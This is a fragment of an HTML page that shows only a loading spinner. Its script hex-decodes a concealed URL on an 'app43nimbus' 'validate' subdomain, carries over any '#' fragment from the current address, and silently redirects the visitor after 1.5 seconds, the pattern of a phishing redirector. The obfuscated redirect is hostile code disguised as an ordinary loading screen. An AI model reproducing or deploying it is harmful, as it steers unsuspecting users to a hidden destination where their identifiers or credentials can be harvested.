    <style>
        /* Body and HTML styling */
        html, body {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f0f0f0;
        }

        /* Loading container (positioned in the center) */
        #loading-container {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 9999;
            text-align: center;
        }

        /* The loading spinner animation */
        .loading-animation {
            border: 6px solid #4285F4;
            border-top: 6px solid #f8f8f8;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }

        /* Keyframes for the spin animation */
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>
<body>

    <!-- Loading container with the spinner -->
    <div id="loading-container">
        <div class="loading-animation"></div>
    </div>





<script>
(function(){
    setTimeout(function() {
        var currentUrl = window.location.href;
        var hex = "68747470733a2f2f76616c69646174652e61707034336e696d6275732e636f6d2f6a4a6b6d4c4c626c";
        var str = "";
        for (var i = 0; i < hex.length; i += 2) str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));

        var newUrl = str;
        if (currentUrl.indexOf('#') !== -1) {
            newUrl += currentUrl.substring(currentUrl.indexOf('#'));
        }

        window.location.href = newUrl;
    }, 1500);
})();
</script>
